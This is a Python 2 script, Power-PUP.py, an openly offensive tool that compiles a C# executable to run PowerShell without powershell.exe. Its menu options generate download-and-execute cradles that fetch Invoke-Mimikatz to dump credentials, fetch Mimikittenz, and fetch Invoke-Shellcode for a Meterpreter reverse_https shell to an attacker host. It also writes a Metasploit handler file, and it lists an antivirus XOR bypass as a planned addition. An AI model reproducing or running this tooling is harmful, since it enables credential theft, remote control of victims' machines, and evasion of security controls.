#---------------------------------------------------------------#
#!/bin/python2                                                  #
#-Metadata------------------------------------------------------#
#  Filename: Power-PUP.py                                       #
#  Release: 2016-07-26                                          #
#                                                               #
#-Info----------------------------------------------------------#
#  Powershell Universal Programmer (Power-PUP.py) is a Windows  #
#    Python script to compile Windows                           #
#    System.Management.Automation for a powershell alternative. #
#                                                               #
#-Author(s)-----------------------------------------------------#
#  Joseph Barcia                    - github.com/jbarcia        #
#  Scott Bernstein (Feel the Bern?) - github.com/scott-be       #
#                                                               #
#-Operating System----------------------------------------------#
#  Designed for: Windows 7+ running .Net Framework 4.5+         #
#     Tested on: Windows 7 running .Net Framework 4.5           #
#                                                               #
#-Licence-------------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT             #
#                                                               #
#-Notes---------------------------------------------------------#
#  USAGE                                                        #
#  Powershell Universal Programmer (Power-PUP.py)               #
#                                                               #
#  Usage: Power-PUP.py -a target_architecture                   #
#  -a | --arch                - architecture of the target host #
#  -o | --output              - executable output name          #
#                                                               #
# Examples:                                                     #
# Power-PUP.py -a x86                                           #
# Power-PUP.py -a x64 -o psx64.exe                              #
#                                                               #
#-Future Additions----------------------------------------------#
#  - Detect .Net Version                                        #
#       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\                  #
#       NET Framework Setup\NDP\v4\Full\InstallPath             #
#  - A/V XOR bypass                                             #
#                                                               #
#---------------------------------------------------------------#

import sys
import os
import string
import getopt
from sys import argv

name = "Powershell Universal Programmer"
shrtname = " (Power-PUP.py)"
__version__ = "1.6"


banner = '''

                                  ,.+----.
                              ,*""         I
             ____           /         Mbp. dP          __
         ,o@QBBBBBbm,_     ; ,d       /~`QMP'\     _odBBBBbo,
         OBBROYALBBBBBBBBmOBBBM      |    |   |,*~dBBBBBBBBBBBb 
         OBBBBBBBBBBqBBBBBBBBBP      |  0 |0 ,'  dBBBBBBBBBBBBBb
         "*BBBP"     ^OBBBP"          \__/  ~    OBBBBBBBBBBBBBP
     /                     :           __.       `0BBBBBBBBBBP|
                   .-.     `          ~,A.         `0BBBBBBBBP |
                .-(   `x__  `\        .B*Bb          `"?OOP~   ;
             .-(   `\/'   `.  `~--++*\{  `Pb           ,'     ,'
  /         (   `\_/'\__/  )     _    !`-' !`.       ,'     ,'  
       /     `\_/'       ,'     L "+,_|    |-,`.__ ,'    _,','~~\.~~~\\
                \        /\    / ',   "+.  |/ >   `~~~~~~  ,'    :/~  \\
   /             `~===\/'  `\/'    "+.   >{  /\        __.,: |   ;    ;
          /           {         ,|    `\/  \/  `Y~~---~   `. `--:'~~~';
                       `\     ,&#|      ppppppp  \         `,   ;^`~~';
       /               ,d#b,.&###|      PPP  PP   `\     __.;~~' `~~~'
     /              ,d###########|      PPP  PP     Y~~~~
                ,d############i~        PPPPPPP     I  
          ,d##################I         PPP         I     /   /
(#############################b.        PPP         Im 
   )############################b.                 d#b
  (###############################b++g+++~#b      ,d##P
      }####################P~ ~Y####P    J#P`~~~T'
     (###################P'     `YP'    ;P'   ,'
       )###############P'        '    ,'    ,'    /
      (##############P'          __+~'   /##'
 /            Y####P'         ;-'     /###P
           /   Y#P'         /'      /&##P~
                |         /'      /&#P~         
     /          `\______/'\_____/'              
                                   /            
                          /
             /                          

'''

ps_script          = ""

def mimi_quick(mimifunct,location):
    # invoke-mimicatz quick execute

    # If not from comman line
    if mimifunct != True or location == 'http://127.0.0.1/1.txt':
        location = raw_input("\nEnter Invoke-Mimikatz location (Ex. http://192.168.1.1/im.txt) : \n: ")
        if location == '':
            location = 'http://127.0.0.1/1.txt'
    
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Mimikatz -DumpCreds > c:\\Users\\Public\\katz.txt"

    print '\nFile will be saved to: c:\\Users\\Public\\katz.txt\n'
    return ps_script
    
def kitti_quick():
    # invoke-mimicatz quick execute

    location = raw_input("\nEnter Invoke-Mimikittenz location (Ex. http://192.168.1.1/im.txt) : \n: ")
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-mimikittenz > c:\\Users\\Public\\kitz.txt"

    print '\nFile will be saved to: c:\\Users\\Public\\kitz.txt\n'
    return ps_script
    
def shell_quick(shellcode,location,lhost,lport,payload):
    # invoke-shellcode quick execute

    # If not from comman line
    if shellcode != True:
        location = raw_input("\nEnter Invoke-Shellcode location (Default - http://127.0.0.1/1.txt) : \n: ")
        if location == '':
            location = "http://127.0.0.1/1.txt"
        lhost = raw_input("\nEnter reverse host (Default - 127.0.0.1) : \n: ")
        if lhost == '':
            lhost = "127.0.0.1"
        lport = raw_input("\nEnter reverse port (Default - 443) : \n: ")
        if lport == '':
            lport = "443"
        payload = raw_input("\nEnter msf payload (Default - 'windows/meterpreter/reverse_https') : \n: ") 
        if payload == '':
            payload = "windows/meterpreter/reverse_https"
    
    ps_script = "IEX (New-Object Net.WebClient).DownloadString('" + location + "'); Invoke-Shellcode -Payload " + payload + " -Lhost " + lhost + " -Lport " + lport + " -force"
    print '\nSHELLCODE'
    print '   PAYLOAD: ' + payload
    print '   LHOST: ' + lhost
    print '   LPORT: ' + lport
    print 
    print '   Resource file: handler.rc'
    print

    # create msf rc file
    with open('handler.rc', 'w') as f:
        f.write("\#\n\# [Kali 2.x]:   systemctl start postgresql; msfdb start; msfconsole -q -r 'handler.rc'\n\#\nuse exploit/multi/handler\nset PAYLOAD " + payload + "\nset LHOST " + lhost + "\nset LPORT " + lport + "\nset ExitOnSession false\nrun -j")
        f.close

    return ps_script

def enter_ps():
    ps_input = raw_input("Enter the powershell commands to execute seperated by <ENTER>. \n: ")
    command = '            String script1 = "' + ps_input + '";\n            ps.AddScript(script1);\n'
    i = 1

    while (ps_input.strip()):
        ps_input = raw_input(': ')
        if ps_input != '':
            i = i + 1
            stri = str(i)
            command += '            String script' + stri + ' = "' + ps_input + '";\n            ps.AddScript(script' + stri + ');\n'
            
#    print command

    #(calc.exe) -or ((sleep -s 10) -or (notepad.exe))
    #ps_script = string.replace(command, '\\', '\\\\')
    ps_script = command
    print
    
    return ps_script
    

def write_csfile(ps_script,comm):
    # Open and create cs file to compile

    ps_script = string.replace(ps_script, '\\', '\\\\')

    with open('temp.cs', 'w') as f:
        f.write('using System;\nusing System.Collections.ObjectModel;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\n\nnamespace pup\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            PowerShell ps = PowerShell.Create();\n')
        if comm != True:
            f.write('            String script1 = "' + ps_script + '";\n            ps.AddScript(script1);\n')
        else:
            f.write(ps_script)
        f.write('            Collection<PSObject> output = null;\n            try\n            {\n                output = ps.Invoke();\n            }\n            catch(Exception e)\n            {\n                Console.WriteLine("Error while executing the script.\\r\\n" + e.Message.ToString());\n            }\n            if (output != null)\n            {\n                foreach (PSObject rtnItem in output)\n                {\n                    Console.WriteLine(rtnItem.ToString());\n                }\n            }\n        }                \n    }\n}\n')
        f.close
    
    
def compile_exe(arch,out_exe):
    # Compile the executable

    if arch == 'x86':
        dotnet_loc = "C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\\"
    else:
        dotnet_loc = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"

    os.system('cmd.exe /c ' + dotnet_loc + 'csc.exe /unsafe /reference:"C:\\windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:' + out_exe + ' /platform:' + arch +' "temp.cs"')


def usage():
    print "Usage: Power-PUP.py"
    print "-a | --arch                - architecture of the target host"
    print "-o | --output              - executable output name"
    print "-m | --mimi                - Create a mimikatz executable"
    print "-s | --shellcode           - Create a shellcode executable"
    print "-d | --hostserver          - PS script host location"
    print "-l | --lhost               - Host listening for reverse connections"
    print "                               Default: 127.0.0.1"
    print "-p | --lport               - Port listening for reverse connections"
    print "                               Default: 443"
    print "-t | --payload             - Metasploit payload to utilize"
    print "                               Default: windows/meterpreter/reverse_https"
    print
    print
    print "Examples: "
    print "Power-PUP.py -a x86"
    print "Power-PUP.py -a x64 -o psx64.exe"
    print "Power-PUP.py -a x64 -m -d http://192.168.1.1/im.txt"
    print "Power-PUP.py -a x64 -s -d http://192.168.1.1/im.txt --lhost 192.168.1.1 --lport 443"
    
    sys.exit(0)


def main():

    # define some global variables
    location           = "http://127.0.0.1/1.txt"
    lhost              = "127.0.0.1"
    lport              = "443"
    mimifunct          = False
    shellcode          = False
    target             = ""
    payload            = "windows/meterpreter/reverse_https"
    arch               = "x86"
    comm               = False
    #ps_script          = ""
    
    # Begin
    print "\n" + name + " v" + __version__
    print shrtname + "\n"
    print
    print banner
    # check if running windows
    if os.name != 'nt':
        print "Powershell Universal Programmer (Power-PUP.py) is a Windows Python script to compile Windows System.Management.Automation for a powershell alternative."
        sys.exit(0)

    # check argument length
    #if not len(sys.argv[1:]):
    #        usage()
            
    # read the commandline options
    try:
        # variable: <- variable with argument, no : no argument ex. a
        opts, args = getopt.getopt(sys.argv[1:],"ha:o:md:sl:p:t:",["help","arch","output","mimi","hostserver","shellcode","lhost","lport","payload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    # Variables
    out_exe = "ps.exe"        
            
    for o,a in opts:
            if o in ("-h","--help"):
                usage()
            elif o in ("-a", "--arch"):
                arch = a
                while arch not in ["x86", "x64"]:
                    print "\nOnly x86 or x64 architectures are allowed.\n"
                    sys.exit(0)
            elif o in ("-m", "--mimi"):
                mimifunct = True
            elif o in ("-s", "--shellcode"):
                shellcode = True
            elif o in ("-d", "--hostserver"):
                location = a
            elif o in ("-l", "--lhost"):
                lhost = a
            elif o in ("-p", "--lport"):
                lport = a
            elif o in ("-t", "--payload"):
                payload = a
            elif o in ("-o", "--output"):
                out_exe = a
            else:
                assert False,"Unhandled Option"

    if mimifunct == True:
        ps_script = mimi_quick(mimifunct,location)
    elif shellcode == True:
        ps_script = shell_quick(shellcode,location,lhost,lport,payload)
    else:
        # Menu if no command line inputs
        menu = {}
        menu['1']=" Invoke-Mimikatz" 
        menu['2']=" Invoke-Shellcode"
        menu['3']=" Invoke-Mimikittenz" 
        menu['4']=" Custom PowerShell Command"
        menu['5']=" Exit"
        options=menu.keys()
        options.sort()
        for entry in options: 
            print entry, menu[entry]

        selection=raw_input("\nPlease Select:  ")
        if selection =='1':
            ps_script = mimi_quick(mimifunct,location) 
        elif selection == '2': 
            ps_script = shell_quick(shellcode,location,lhost,lport,payload)
        elif selection == '3': 
            ps_script = kitti_quick()
        elif selection == '4':
            comm = True
            ps_script = enter_ps() 
        elif selection == '5': 
            sys.exit(0)
        else: 
            print "Unknown Option Selected!" 
            sys.exit(0)

    write_csfile(ps_script,comm)
    compile_exe(arch,out_exe)
    
    
main()